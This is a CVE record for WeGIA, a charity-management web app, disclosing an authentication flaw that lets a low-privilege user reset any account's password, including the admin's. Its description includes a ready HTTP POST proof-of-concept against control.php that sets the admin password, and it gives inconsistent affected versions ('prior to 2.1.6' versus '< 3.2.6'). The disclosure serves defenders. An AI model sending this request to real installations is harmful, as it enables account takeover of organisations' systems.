{
    "dataType": "CVE_RECORD",
    "dataVersion": "5.1",
    "cveMetadata": {
        "cveId": "CVE-2025-30361",
        "assignerOrgId": "a0819718-46f1-4df5-94e2-005712e83aaa",
        "state": "PUBLISHED",
        "assignerShortName": "GitHub_M",
        "dateReserved": "2025-03-21T14:12:06.271Z",
        "datePublished": "2025-03-27T16:22:42.924Z",
        "dateUpdated": "2025-03-27T16:22:42.924Z"
    },
    "containers": {
        "cna": {
            "title": "WeGIA Vulnerable to Broken Authentication - Old Password Validation",
            "problemTypes": [
                {
                    "descriptions": [
                        {
                            "cweId": "CWE-287",
                            "lang": "en",
                            "description": "CWE-287: Improper Authentication",
                            "type": "CWE"
                        }
                    ]
                }
            ],
            "metrics": [
                {
                    "cvssV4_0": {
                        "attackVector": "NETWORK",
                        "attackComplexity": "LOW",
                        "attackRequirements": "NONE",
                        "privilegesRequired": "LOW",
                        "userInteraction": "NONE",
                        "vulnConfidentialityImpact": "HIGH",
                        "vulnIntegrityImpact": "HIGH",
                        "vulnAvailabilityImpact": "LOW",
                        "subConfidentialityImpact": "LOW",
                        "subIntegrityImpact": "HIGH",
                        "subAvailabilityImpact": "LOW",
                        "baseScore": 9.3,
                        "baseSeverity": "CRITICAL",
                        "vectorString": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:L/SC:L/SI:H/SA:L",
                        "version": "4.0"
                    }
                }
            ],
            "references": [
                {
                    "name": "https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-m6qw-r3m9-jf7h",
                    "tags": [
                        "x_refsource_CONFIRM"
                    ],
                    "url": "https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-m6qw-r3m9-jf7h"
                }
            ],
            "affected": [
                {
                    "vendor": "LabRedesCefetRJ",
                    "product": "WeGIA",
                    "versions": [
                        {
                            "version": "< 3.2.6",
                            "status": "affected"
                        }
                    ]
                }
            ],
            "providerMetadata": {
                "orgId": "a0819718-46f1-4df5-94e2-005712e83aaa",
                "shortName": "GitHub_M",
                "dateUpdated": "2025-03-27T16:22:42.924Z"
            },
            "descriptions": [
                {
                    "lang": "en",
                    "value": "WeGIA is a Web manager for charitable institutions. A security vulnerability was identified in versions prior to 2.1.6, where it is possible to change a user's password without verifying the old password. This issue exists in the control.php endpoint and allows unauthorized attackers to bypass authentication and authorization mechanisms to reset the password of any user, including admin accounts. Version 3.2.6 fixes the issue.\n\n\n\n### Details\nVulnerable Endpoint:\nPOST /WeGIA/controle/control.php\n\nHTTP Request Example:\n````\n\nPOST /WeGIA/controle/control.php HTTP/1.1\nHost: comfirewall.wegia.org:8000\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 149\n\nsenha_antiga=A&nova_senha=wegia&confirmar_senha=wegia&nomeClasse=FuncionarioControle&metodo=alterarSenha&redir=logout.php&id_pessoa=1&alterar=Alterar\n````\n### PoC\nChange the default password wegiafrom admin user and use a random value in the field senha_antiga:\n![image](https://github.com/user-attachments/assets/e80d2d1b-aee5-4c19-b923-91b5f04516c7)\nLogin with the new password:\n![image](https://github.com/user-attachments/assets/9bcf815e-7c45-4207-bc0b-f66bb42518fc)\n\n### Impact\nThe request successfully changes the password of the user identified by id_pessoa=1 (admin user) without checking prior password validation."
                }
            ],
            "source": {
                "advisory": "GHSA-m6qw-r3m9-jf7h",
                "discovery": "UNKNOWN"
            }
        }
    }
}